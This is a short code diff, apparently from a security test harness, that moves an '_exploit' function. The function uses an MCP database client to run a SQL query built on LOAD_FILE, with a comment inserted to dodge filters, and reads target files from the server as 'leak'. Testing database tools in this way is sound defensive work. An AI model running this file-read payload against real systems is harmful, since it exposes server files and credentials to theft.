@@ -80,6 +80,16 @@ KEPT_PLACES: tuple[str, ...] = (
 )
 
 
+def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
+    async def run(places: Places, client: MCPClientPort) -> None:
+        await _connect(client)
+        for target in _read_targets(places[place_id]):
+            sql = f"SELECT CAST(LOAD_FILE/**/('{target}') AS CHAR) AS leak"
+            await client.call_tool("run_query", {**_RUN_BASE, "sql": sql})
+
+    return run
+
+
 def _read_targets(place: Place) -> list[str]:
     if place.kind is PlaceKind.FILE:
         coords = place.coordinates
@@ -98,16 +108,6 @@ def _read_targets(place: Place) -> list[str]:
 
 async def _connect(client: MCPClientPort) -> None:
     await client.call_tool("connect_to_database", dict(_CONNECT_ARGS))
-
-
-def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
-    async def run(places: Places, client: MCPClientPort) -> None:
-        await _connect(client)
-        for target in _read_targets(places[place_id]):
-            sql = f"SELECT CAST(LOAD_FILE/**/('{target}') AS CHAR) AS leak"
-            await client.call_tool("run_query", {**_RUN_BASE, "sql": sql})
-
-    return run
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
